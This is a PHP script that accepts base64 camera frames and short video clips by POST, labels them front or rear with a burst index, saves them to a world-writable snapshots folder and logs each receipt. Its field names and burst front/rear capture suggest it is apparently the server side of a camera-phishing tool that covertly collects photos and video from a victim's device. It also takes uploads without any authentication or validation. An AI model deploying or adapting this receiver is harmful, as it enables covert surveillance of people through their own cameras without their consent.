<?php
$date = date('dMYHis');

// ── Save snapshots directory ──────────────────────────────────────────────────
$save_dir = 'snapshots';
if (!is_dir($save_dir)) mkdir($save_dir, 0777, true);

// ── Handle photo / burst frame ────────────────────────────────────────────────
if (!empty($_POST['cat'])) {
    $imageData     = $_POST['cat'];
    $burst_index   = isset($_POST['burst_index'])  ? intval($_POST['burst_index'])  : 0;
    $cam_facing    = isset($_POST['cam_facing'])    ? $_POST['cam_facing']           : 'user';   // user | environment
    $shot_type     = isset($_POST['shot_type'])     ? $_POST['shot_type']            : 'burst';  // burst | rear

    $filteredData  = substr($imageData, strpos($imageData, ',') + 1);
    $unencodedData = base64_decode($filteredData);

    $label    = $cam_facing === 'environment' ? 'rear' : 'front';
    $filepath = $save_dir . '/cam_' . $label . '_' . $date . '_' . sprintf('%03d', $burst_index) . '.jpg';

    file_put_contents($filepath, $unencodedData);
    error_log("Received\r\n", 3, 'Log.log');
}

// ── Handle short video clip (base64 webm blob) ────────────────────────────────
if (!empty($_POST['video_clip'])) {
    $videoData     = $_POST['video_clip'];
    $cam_facing    = isset($_POST['cam_facing']) ? $_POST['cam_facing'] : 'user';
    $label         = $cam_facing === 'environment' ? 'rear' : 'front';
    $filteredData  = substr($videoData, strpos($videoData, ',') + 1);
    $unencodedData = base64_decode($filteredData);
    $filepath      = $save_dir . '/vid_' . $label . '_' . $date . '.webm';
    file_put_contents($filepath, $unencodedData);
    error_log("Received\r\n", 3, 'Log.log');
}

header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
exit();
?>
